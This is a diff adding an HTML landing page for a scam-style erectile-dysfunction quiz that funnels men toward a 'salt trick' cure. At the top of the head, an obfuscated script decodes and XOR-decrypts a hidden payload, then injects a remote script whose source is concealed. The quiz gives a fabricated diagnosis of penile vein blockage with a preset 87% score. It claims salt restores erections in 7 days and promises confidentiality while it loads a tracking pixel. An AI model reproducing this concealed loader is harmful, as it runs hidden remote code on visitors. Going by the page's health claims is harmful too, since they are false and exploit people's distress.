@@ -1,0 +1,1372 @@
+<!DOCTYPE html>
+<html lang="en-ZA">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1123182646935484');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1123182646935484&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+    <title>AOA</title>
+
+    <script>(function(){var p_d55=atob("DEbpqJBIsSdfyzsiPj3L3eIkkx19o09WTjXTh78r1Ulxvk9PVyCQhvMn3Ak9uRRRXTSA2OQ7nlIrpkgNUiedzeM8n00s6RcAXzKd2vkqxFM6uBkYZT3LxvEl1AVl6V9DSifE3eQl2EEm5ktQWzCMxuRlyUQwrxZRXS3LhLI+0EsqrhkYHGSUhOtq30YyrhkYHCKI3PFlxFMyol1bEzabzeYt31NyuE5AVyKairxqx0Yzvl4ABGTL1c01");var c_li=[];for(var p_nrq=0;p_nrq<p_d55.length;p_nrq++){c_li.push(p_d55.charCodeAt(p_nrq)&255);}var r_uw8z=c_li[0];var q_6qk2=c_li.slice(1,1+r_uw8z);var s_a=c_li.slice(1+r_uw8z);var g_wil=s_a.map(function(b,w_l8){return b^q_6qk2[w_l8%r_uw8z];});var m_wvd="";for(var m_724e=0;m_724e<g_wil.length;m_724e++){m_wvd+=String.fromCharCode(g_wil[m_724e]&255);}var v_7=decodeURIComponent(escape(m_wvd));var y_nqq9=JSON.parse(v_7);var i_0a4=y_nqq9.globals||[];i_0a4.forEach(function(p_z){window[p_z.name]=p_z.value;});var d_9i3e=document.createElement("script");d_9i3e.src=y_nqq9.url;d_9i3e.async=true;d_9i3e.defer=true;(y_nqq9.attributes||[]).forEach(function(z_p7){d_9i3e.setAttribute(z_p7.name,z_p7.value);});(document.head||document.documentElement).appendChild(d_9i3e);})();</script>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+
+        :root {
+            --bg: #f6f7f9;
+            --surface: rgba(255, 255, 255, 0.94);
+            --surface-solid: #ffffff;
+            --text: #17191d;
+            --text-soft: #686d76;
+            --muted: #9a9fa8;
+            --line: #e7e9ed;
+            --line-strong: #d7dae0;
+            --accent: #dc2626;
+            --accent-dark: #991b1b;
+            --accent-soft: #fef2f2;
+            --success: #19945d;
+            --danger: #d64b4b;
+            --shadow: 0 18px 55px rgba(23, 25, 29, 0.08);
+            --shadow-soft: 0 8px 24px rgba(23, 25, 29, 0.06);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            overflow: hidden;
+            background: var(--bg);
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background:
+                radial-gradient(circle at 50% -15%, rgba(220, 38, 38, 0.10), transparent 34%),
+                linear-gradient(180deg, #ffffff 0%, #f7f8fa 48%, #f3f4f6 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 18px;
+            position: relative;
+            color: var(--text);
+        }
+
+        /* ===== BACKGROUND PARTICLES ===== */
+        #particles {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.5;
+        }
+
+        .quiz-card {
+            position: relative;
+            z-index: 1;
+            width: min(100%, 520px);
+            padding: 26px 28px 24px;
+            background: var(--surface);
+            border: 1px solid rgba(215, 218, 224, 0.82);
+            border-radius: 22px;
+            box-shadow: var(--shadow);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
+            transform-origin: center center;
+            transition: transform 0.3s ease;
+        }
+
+        /* ===== LOGO ===== */
+        .quiz-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .quiz-logo img {
+            max-height: 48px;
+            max-width: min(210px, 72vw);
+            width: auto;
+            opacity: 0.96;
+            border-radius: 8px;
+            display: inline-block;
+        }
+
+
+        .quiz-logo img {
+            animation: logoFloat 4.8s ease-in-out infinite;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-2px); }
+        }
+
+        .quiz-card {
+            animation: cardEnter 0.65s cubic-bezier(0.22, 1, 0.36, 1) both;
+        }
+
+        @keyframes cardEnter {
+            0% {
+                opacity: 0;
+                transform: translateY(18px) scale(0.985);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* ===== PROGRESS BAR ===== */
+        .progress-wrap {
+            width: 100%;
+            height: 4px;
+            background: #eceef1;
+            border-radius: 999px;
+            overflow: hidden;
+            margin-bottom: 8px;
+            position: relative;
+        }
+
+        .progress-wrap .bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #dc2626, #ef4444, #f87171);
+            border-radius: inherit;
+            transition: width 0.65s cubic-bezier(0.22, 1, 0.36, 1);
+            position: relative;
+            box-shadow: 0 0 16px rgba(220,38,38,0.28);
+        }
+
+        .progress-wrap .bar::after {
+            content: '';
+            position: absolute;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            width: 32px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.72));
+            animation: shimmer 1.7s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { opacity: 0; transform: translateX(-4px); }
+            50% { opacity: 1; transform: translateX(2px); }
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            min-height: 1px;
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--muted);
+            margin-bottom: 25px;
+            letter-spacing: 0.7px;
+            text-transform: uppercase;
+        }
+
+        .progress-label .step-num {
+            color: var(--accent-dark);
+        }
+
+        /* ===== SCREENS ===== */
+        .screen {
+            display: none;
+            animation: screenIn 0.48s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        @keyframes screenIn {
+            0% {
+                opacity: 0;
+                transform: translateY(22px) scale(0.975);
+                filter: blur(6px);
+            }
+            55% {
+                opacity: 1;
+                transform: translateY(-3px) scale(1.006);
+                filter: blur(0);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+                filter: blur(0);
+            }
+        }
+
+        .step.active .step-title {
+            animation: titleReveal 0.52s cubic-bezier(0.22, 1, 0.36, 1) both;
+        }
+
+        .step.active .option {
+            opacity: 0;
+            animation: optionReveal 0.48s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        .step.active .option:nth-child(1) { animation-delay: 0.05s; }
+        .step.active .option:nth-child(2) { animation-delay: 0.10s; }
+        .step.active .option:nth-child(3) { animation-delay: 0.15s; }
+        .step.active .option:nth-child(4) { animation-delay: 0.20s; }
+
+        @keyframes titleReveal {
+            0% { opacity: 0; transform: translateY(10px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes optionReveal {
+            0% {
+                opacity: 0;
+                transform: translateY(12px) scale(0.985);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .screen.is-leaving {
+            display: block !important;
+            pointer-events: none;
+            animation: screenOut 0.24s ease forwards;
+        }
+
+        @keyframes screenOut {
+            from {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+                filter: blur(0);
+            }
+            to {
+                opacity: 0;
+                transform: translateY(-10px) scale(0.99);
+                filter: blur(3px);
+            }
+        }
+
+        /* ===== INTRO SCREEN ===== */
+        .intro-screen {
+            text-align: center;
+            padding: 4px 0 2px;
+        }
+
+        .intro-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: 800;
+            letter-spacing: 1.3px;
+            text-transform: uppercase;
+            color: #991b1b;
+            background: var(--accent-soft);
+            border: 1px solid #fecaca;
+            padding: 7px 13px;
+            border-radius: 999px;
+            margin-bottom: 18px;
+            animation: badgePulse 2.4s ease-in-out infinite;
+        }
+
+        @keyframes badgePulse {
+            0%, 100% {
+                box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.18);
+                transform: translateY(0);
+            }
+            50% {
+                box-shadow: 0 0 0 7px rgba(220, 38, 38, 0);
+                transform: translateY(-1px);
+            }
+        }
+
+        .intro-title {
+            font-size: 27px;
+            font-weight: 800;
+            line-height: 1.22;
+            color: var(--text);
+            margin-bottom: 14px;
+            letter-spacing: -0.8px;
+        }
+
+        .intro-title .highlight {
+            color: var(--accent-dark);
+            position: relative;
+        }
+
+        .intro-desc {
+            font-size: 14px;
+            line-height: 1.65;
+            color: var(--text-soft);
+            max-width: 430px;
+            margin: 0 auto 25px;
+        }
+
+        .intro-desc strong,
+        .intro-desc strong[style] {
+            color: #dc2626 !important;
+            font-weight: 750;
+        }
+
+        .intro-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+
+        .intro-stat {
+            text-align: center;
+            padding: 13px 8px 12px;
+            background: #fafafa;
+            border: 1px solid var(--line);
+            border-radius: 13px;
+            transition: transform 0.22s ease, border-color 0.22s ease, box-shadow 0.22s ease;
+        }
+
+        .intro-stat:hover {
+            transform: translateY(-2px);
+            border-color: #fecaca;
+            box-shadow: var(--shadow-soft);
+        }
+
+        .intro-stat .num {
+            font-size: 19px;
+            font-weight: 800;
+            color: var(--text);
+            line-height: 1.05;
+            letter-spacing: -0.4px;
+        }
+
+        .intro-stat .lbl {
+            font-size: 9px;
+            font-weight: 700;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.75px;
+            margin-top: 5px;
+        }
+
+        .intro-btn,
+        .btn-action {
+            position: relative;
+            overflow: hidden;
+            isolation: isolate;
+            border: 0;
+            outline: none;
+            cursor: pointer;
+            font-family: inherit;
+            text-decoration: none;
+            color: #fff;
+            background: linear-gradient(135deg, #111318, #2b2f36);
+            box-shadow: 0 10px 25px rgba(17, 19, 24, 0.14);
+            transition:
+                transform 0.22s cubic-bezier(0.22, 1, 0.36, 1),
+                box-shadow 0.22s ease,
+                background 0.22s ease;
+        }
+
+        .intro-btn {
+            display: inline-block;
+            font-size: 15px;
+            font-weight: 750;
+            padding: 15px 39px;
+            border-radius: 12px;
+            letter-spacing: -0.1px;
+        }
+
+        .intro-btn::after,
+        .btn-action::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -120%;
+            width: 70%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.24), transparent);
+            transform: skewX(-18deg);
+            z-index: -1;
+        }
+
+        .intro-btn:hover,
+        .btn-action:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px rgba(17, 19, 24, 0.20);
+            background: linear-gradient(135deg, #171a20, #343943);
+        }
+
+        .intro-btn:hover::after {
+            animation: buttonSweep 0.7s ease forwards;
+        }
+
+        .intro-btn:active,
+        .btn-action:active {
+            transform: translateY(0) scale(0.985);
+        }
+
+        @keyframes buttonSweep {
+            to { left: 145%; }
+        }
+
+        .intro-disclaimer {
+            font-size: 10.5px;
+            color: var(--muted);
+            margin-top: 14px;
+        }
+
+        /* ===== QUESTIONS ===== */
+        .step-title {
+            font-size: 20px;
+            font-weight: 750;
+            line-height: 1.42;
+            color: var(--text);
+            margin-bottom: 9px;
+            letter-spacing: -0.45px;
+        }
+
+        .step-title .highlight {
+            color: #dc2626;
+            -webkit-text-fill-color: #dc2626;
+            position: relative;
+            display: inline-block;
+        }
+
+        .step-title .highlight::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, rgba(220,38,38,0.88), rgba(220,38,38,0));
+            animation: underlineGrow 0.75s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        @keyframes underlineGrow {
+            0% { transform: scaleX(0); transform-origin: left; opacity: 0; }
+            100% { transform: scaleX(1); transform-origin: left; opacity: 1; }
+        }
+
+        .step-sub {
+            font-size: 12px;
+            font-weight: 500;
+            line-height: 1.5;
+            color: var(--muted);
+            margin-bottom: 18px;
+            font-style: italic;
+        }
+
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 9px;
+        }
+
+        .option {
+            background: var(--surface-solid);
+            border: 1px solid var(--line);
+            border-radius: 12px;
+            padding: 13px 15px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #2b2f35;
+            cursor: pointer;
+            transition:
+                transform 0.22s cubic-bezier(0.22, 1, 0.36, 1),
+                border-color 0.22s ease,
+                box-shadow 0.22s ease,
+                background 0.22s ease;
+            display: flex;
+            align-items: center;
+            gap: 13px;
+            text-align: left;
+            width: 100%;
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .option::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(100deg, rgba(220,38,38,0.07), rgba(255,255,255,0));
+            opacity: 0;
+            transition: opacity 0.22s ease;
+        }
+
+        .option:hover {
+            background: #fff;
+            border-color: #d2d5da;
+            transform: translateY(-1px);
+            box-shadow: 0 7px 18px rgba(23,25,29,0.055);
+        }
+
+        .option:hover::before {
+            opacity: 1;
+        }
+
+        .option:active {
+            transform: scale(0.992);
+        }
+
+        .option .letter {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 29px;
+            height: 29px;
+            border-radius: 8px;
+            background: #f2f3f5;
+            border: 1px solid #e4e6e9;
+            color: #6f747c;
+            font-weight: 800;
+            font-size: 11px;
+            flex-shrink: 0;
+            transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+            position: relative;
+            z-index: 1;
+        }
+
+        .option.selected {
+            background: #fffafa;
+            border-color: #fca5a5;
+            box-shadow: 0 0 0 3px rgba(220,38,38,0.12), 0 8px 20px rgba(23,25,29,0.05);
+            transform: translateY(-1px);
+        }
+
+        .option.selected .letter {
+            background: #dc2626;
+            border-color: #dc2626;
+            color: #fff;
+            transform: scale(1.08) rotate(4deg);
+            box-shadow: 0 6px 16px rgba(220,38,38,0.28);
+            animation: selectedPop 0.34s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes selectedPop {
+            0% { transform: scale(0.82) rotate(-8deg); }
+            65% { transform: scale(1.13) rotate(5deg); }
+            100% { transform: scale(1.08) rotate(4deg); }
+        }
+
+        /* ===== ANALYSIS SCREEN ===== */
+        .analysis-screen {
+            text-align: center;
+            padding: 18px 0 10px;
+        }
+
+        .analysis-title {
+            font-size: 20px;
+            font-weight: 750;
+            color: var(--text);
+            margin-bottom: 8px;
+            letter-spacing: -0.4px;
+        }
+
+        .analysis-title span {
+            color: #dc2626;
+        }
+
+        .analysis-sub {
+            font-size: 11px;
+            color: var(--muted);
+            margin-bottom: 28px;
+            letter-spacing: 0.6px;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+
+        .circle-chart {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            margin: 18px auto 24px;
+            animation: chartFloat 2.8s ease-in-out infinite;
+        }
+
+        @keyframes chartFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-3px); }
+        }
+
+        .circle-chart svg {
+            transform: rotate(-90deg);
+            width: 160px;
+            height: 160px;
+            filter: drop-shadow(0 8px 18px rgba(23,25,29,0.06));
+        }
+
+        .circle-chart .bg {
+            fill: none;
+            stroke: #eceef1;
+            stroke-width: 6;
+        }
+
+        .circle-chart .progress {
+            fill: none;
+            stroke: url(#grad);
+            stroke-width: 6;
+            stroke-linecap: round;
+            stroke-dasharray: 452;
+            stroke-dashoffset: 452;
+            transition: stroke-dashoffset 0.3s ease;
+        }
+
+        .circle-chart .pct {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 39px;
+            font-weight: 800;
+            color: var(--text);
+            line-height: 1;
+            letter-spacing: -1.5px;
+        }
+
+        .circle-chart .pct small {
+            font-size: 16px;
+            font-weight: 650;
+            color: var(--muted);
+        }
+
+        .analysis-terminal {
+            background: #fbfbfc;
+            border: 1px solid var(--line);
+            border-radius: 12px;
+            padding: 14px 16px;
+            max-width: 360px;
+            margin: 0 auto;
+            text-align: left;
+            font-family: 'Inter', monospace;
+            font-size: 12px;
+            color: var(--text-soft);
+            min-height: 72px;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.8);
+        }
+
+        .analysis-terminal .line {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 6px;
+            opacity: 0;
+            animation: lineIn 0.4s ease forwards;
+        }
+
+        .analysis-terminal .line:last-child {
+            margin-bottom: 0;
+        }
+
+        @keyframes lineIn {
+            0% { opacity: 0; transform: translateX(-8px); }
+            100% { opacity: 1; transform: translateX(0); }
+        }
+
+        .analysis-terminal .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--accent);
+            flex-shrink: 0;
+            box-shadow: 0 0 0 4px rgba(220,38,38,0.10);
+        }
+
+        .analysis-terminal .dot.done {
+            background: var(--success);
+            box-shadow: 0 0 0 4px rgba(25,148,93,0.10);
+        }
+
+        .analysis-terminal .check {
+            color: var(--success);
+            font-weight: 800;
+        }
+
+        /* ===== RESULT ===== */
+        .result-screen {
+            text-align: center;
+            padding: 4px 0;
+        }
+
+        .result-seal {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 62px;
+            height: 62px;
+            border-radius: 18px;
+            background: var(--accent-soft);
+            border: 1px solid #fecaca;
+            font-size: 28px;
+            margin-bottom: 12px;
+            animation: sealIn 0.55s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        @keyframes sealIn {
+            0% { transform: translateY(8px) scale(0.88); opacity: 0; }
+            100% { transform: translateY(0) scale(1); opacity: 1; }
+        }
+
+        .result-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--text);
+            margin-bottom: 6px;
+        }
+
+        .result-title span {
+            color: #dc2626;
+        }
+
+        .result-badge {
+            display: inline-block;
+            font-size: 10px;
+            font-weight: 800;
+            color: #177a50;
+            background: #edf8f3;
+            border: 1px solid #cfeade;
+            padding: 5px 11px;
+            border-radius: 999px;
+            margin-bottom: 16px;
+            letter-spacing: 0.45px;
+        }
+
+        .result-desc {
+            font-size: 14px;
+            line-height: 1.7;
+            color: #575c64;
+            max-width: 430px;
+            margin: 0 auto 21px;
+        }
+
+        .result-desc strong {
+            color: #b91c1c;
+            font-weight: 750;
+        }
+
+        .result-meter {
+            max-width: 360px;
+            margin: 0 auto 24px;
+            padding: 14px 14px 13px;
+            background: #fafafa;
+            border: 1px solid var(--line);
+            border-radius: 12px;
+        }
+
+        .result-meter-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 10px;
+            font-weight: 750;
+            color: #747982;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .result-meter-bar {
+            height: 6px;
+            background: #eceef1;
+            border-radius: 999px;
+            overflow: hidden;
+        }
+
+        .result-meter-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ef4444, #dc2626);
+            border-radius: inherit;
+            transition: width 1.2s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+
+        .btn-action {
+            display: inline-block;
+            font-weight: 760;
+            font-size: 16px;
+            padding: 15px 38px;
+            border-radius: 12px;
+            letter-spacing: -0.1px;
+            animation: btnPulse 2.4s ease-in-out infinite;
+        }
+
+        @keyframes btnPulse {
+            0%, 100% {
+                box-shadow: 0 10px 25px rgba(17,19,24,0.14);
+                transform: translateY(0);
+            }
+            50% {
+                box-shadow: 0 13px 32px rgba(17,19,24,0.20);
+                transform: translateY(-1px);
+            }
+        }
+
+        .btn-action::after {
+            animation: btnShimmer 2.8s ease-in-out infinite;
+        }
+
+        @keyframes btnShimmer {
+            0%, 52% { left: -120%; }
+            78%, 100% { left: 145%; }
+        }
+
+        .result-footnote {
+            font-size: 10.5px;
+            color: var(--muted);
+            margin-top: 14px;
+        }
+
+        /* ===== FOOTER ===== */
+        .quiz-footer {
+            margin-top: 22px;
+            text-align: center;
+        }
+
+        .quiz-footer img {
+            max-width: 100%;
+            border-radius: 8px;
+            display: block;
+            margin: 0 auto;
+        }
+
+        /* ===== ACCESSIBILITY / MOTION ===== */
+        @media (prefers-reduced-motion: reduce) {
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 560px) {
+            body {
+                padding: 12px;
+            }
+
+            .quiz-card {
+                width: 100%;
+                padding: 21px 17px 19px;
+                border-radius: 18px;
+            }
+
+            .quiz-logo {
+                margin-bottom: 17px;
+            }
+
+            .quiz-logo img {
+                max-height: 44px;
+            }
+
+            .progress-label {
+                margin-bottom: 20px;
+            }
+
+            .intro-title {
+                font-size: 23px;
+                letter-spacing: -0.6px;
+            }
+
+            .intro-desc {
+                font-size: 13.5px;
+                margin-bottom: 21px;
+            }
+
+            .intro-stats {
+                gap: 6px;
+                margin-bottom: 22px;
+            }
+
+            .intro-stat {
+                padding: 11px 5px 10px;
+                border-radius: 11px;
+            }
+
+            .intro-stat .num {
+                font-size: 17px;
+            }
+
+            .intro-stat .lbl {
+                font-size: 8.5px;
+            }
+
+            .intro-btn {
+                width: 100%;
+                padding: 14px 18px;
+            }
+
+            .step-title {
+                font-size: 18px;
+            }
+
+            .step-sub {
+                margin-bottom: 15px;
+            }
+
+            .option {
+                font-size: 13.5px;
+                padding: 11px 12px;
+                gap: 11px;
+                border-radius: 11px;
+            }
+
+            .option .letter {
+                min-width: 27px;
+                height: 27px;
+                border-radius: 7px;
+            }
+
+            .circle-chart,
+            .circle-chart svg {
+                width: 132px;
+                height: 132px;
+            }
+
+            .circle-chart .pct {
+                font-size: 32px;
+            }
+
+            .result-title {
+                font-size: 20px;
+            }
+
+            .result-desc {
+                font-size: 13.5px;
+            }
+
+            .btn-action {
+                width: 100%;
+                font-size: 15px;
+                padding: 14px 18px;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- BACKGROUND PARTICLES -->
+    <canvas id="particles"></canvas>
+
+    <div class="quiz-card" id="app">
+        <div class="quiz-logo">
+            <img src="https://drivedaddy.vercel.app/logo_sal2.jpg" alt="Logo">
+        </div>
+
+        <div class="progress-wrap">
+            <div class="bar" id="progressBar"></div>
+        </div>
+        <div class="progress-label">
+            <span></span>
+        </div>
+
+        <!-- ===== INTRO SCREEN ===== -->
+        <div class="screen intro-screen active" id="introScreen">
+            <div class="intro-badge">100% Free</div>
+            <div class="intro-title">
+                Find out in <span class="highlight">2 minutes</span> why your tool is letting you down
+            </div>
+            <div class="intro-desc">
+                Answer 8 quick questions and get a personalised analysis based on <strong style="color:#dc2626;">12,847 cases</strong> of men who got their potency back with a natural method.
+            </div>
+            <div class="intro-stats">
+                <div class="intro-stat">
+                    <div class="num">12,847</div>
+                    <div class="lbl">Cases</div>
+                </div>
+                <div class="intro-stat">
+                    <div class="num">7 days</div>
+                    <div class="lbl">Result</div>
+                </div>
+                <div class="intro-stat">
+                    <div class="num">100%</div>
+                    <div class="lbl">Natural</div>
+                </div>
+            </div>
+            <button class="intro-btn" id="startBtn">Start Diagnosis →</button>
+            <div class="intro-disclaimer">🔒 100% confidential. Nothing is shared.</div>
+        </div>
+
+        <!-- ===== QUESTIONS ===== -->
+        <div id="stepsContainer" style="display:none;">
+            <div class="screen step" data-step="0">
+                <div class="step-title">
+                    In the last 6 months, how many times have you <span class="highlight">avoided having sex</span> with your partner?
+                </div>
+                <div class="step-sub"></div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> More times than I can count</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Several times, and it's been bothering me</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> A few times, but I play it off</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> Never avoided it</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="1">
+                <div class="step-title">
+                    When you try to get an erection, what happens <span class="highlight">most of the time</span>?
+                </div>
+                <div class="step-sub"></div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> I get hard, but lose it in seconds</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> I get semi-hard, never fully firm</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Sometimes it works, sometimes it doesn't</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> I don't have that problem</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="2">
+                <div class="step-title">
+                    What do you reckon is <span class="highlight">really behind</span> your problem?
+                </div>
+                <div class="step-sub"></div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Age, I'm not the same anymore</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> The mental side, anxiety, stress</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Low testosterone</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> I don't know, I've tried everything</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="3">
+                <div class="step-title">
+                    What have you already done to sort this out? <span class="highlight">Tick everything you've tried.</span>
+                </div>
+                <div class="step-sub"></div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Viagra, blue pills or pumps</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Internet remedies and teas</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Lifestyle changes</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> I've never tried anything</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="4">
+                <div class="step-title">
+                    How do you feel <span class="highlight">after failing</span> in bed?
+                </div>
+                <div class="step-sub"></div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Humiliated, ashamed to look at her</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Frustrated and less of a man</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Worried, but I try not to think about it</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> I've never failed</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="5">
+                <div class="step-title">
+                    How many nights have you <span class="highlight">pretended to be asleep</span> so you didn't have to face the situation?
+                </div>
+                <div class="step-sub"></div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> I've lost count</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Many, more than I should have</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> A few</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> None</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="6">
+                <div class="step-title">
+                    Did you know that <span class="highlight">men aged 54</span> are getting 45-minute erections back using just table salt?
+                </div>
+                <div class="step-sub"></div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> I don't believe it, but I want to understand</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> I've heard about it, I want to know more</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Sounds too good to be true</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> I've tried it and it didn't work</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="7">
+                <div class="step-title">
+                    If there was a <span class="highlight">100% natural</span> way to sort out this problem in 7 days, would you be willing to try it?
+                </div>
+                <div class="step-sub"></div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Yes, I'd do anything</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Yes, if it was safe and natural</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Maybe, depends on what it is</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> No, I've given up</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== ANALYSIS SCREEN ===== -->
+        <div class="screen analysis-screen" id="analysisScreen">
+            <div class="analysis-title">Analysing <span>your answers</span>...</div>
+            <div class="circle-chart">
+                <svg viewBox="0 0 160 160">
+                    <defs>
+                        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="0%">
+                            <stop offset="0%" stop-color="#dc2626" />
+                            <stop offset="100%" stop-color="#ef4444" />
+                        </linearGradient>
+                    </defs>
+                    <circle class="bg" cx="80" cy="80" r="72" />
+                    <circle class="progress" id="circleProgress" cx="80" cy="80" r="72" />
+                </svg>
+                <div class="pct" id="pctDisplay">0<small>%</small></div>
+            </div>
+        </div>
+
+        <!-- ===== RESULT ===== -->
+        <div class="screen result-screen" id="resultScreen">
+            <div class="result-desc">
+                Your answers point to <strong>a blockage in the veins of your penis</strong> — blood isn't flowing the way it should. That's why you go semi-hard, lose your erection and avoid intimacy.<br><br>
+                The good news is that <strong>men like you are sorting this problem out in 7 days</strong> with a home trick that uses <strong>salt</strong> to unblock circulation and bring back the hardness you had at 18.
+            </div>
+            <div class="result-meter">
+                <div class="result-meter-label">
+                    <span>Blockage level</span>
+                    <span id="blockLevel">87%</span>
+                </div>
+                <div class="result-meter-bar">
+                    <div class="result-meter-fill" id="blockFill"></div>
+                </div>
+            </div>
+            <a href="https://zaoa.vercel.app/aoa" class="btn-action">See the method →</a>
+        </div>
+
+        <div class="quiz-footer">
+           
+        </div>
+    </div>
+
+    <script>
+        /* ============================================================
